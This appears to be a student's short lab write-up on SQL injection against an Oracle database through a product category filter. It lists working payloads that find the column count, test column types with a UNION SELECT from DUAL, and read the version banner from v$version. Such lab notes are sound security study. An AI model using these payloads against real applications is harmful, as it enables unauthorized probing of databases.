lab 07 - SQL injection attack, querying the database type and version on ORacle 

SQL Injection - Product category filter

End Goal - display the database version string

Analysis:

(1) Determin no of colounms 
' order by 3-- -> internal server error

3-1 = 2

(2) Determine the data types of the columns 

' UNION SELECT 'a', 'a' from DUAL--

(3) output the database version

' UNION SELECT banner, NULL from v$version-- 
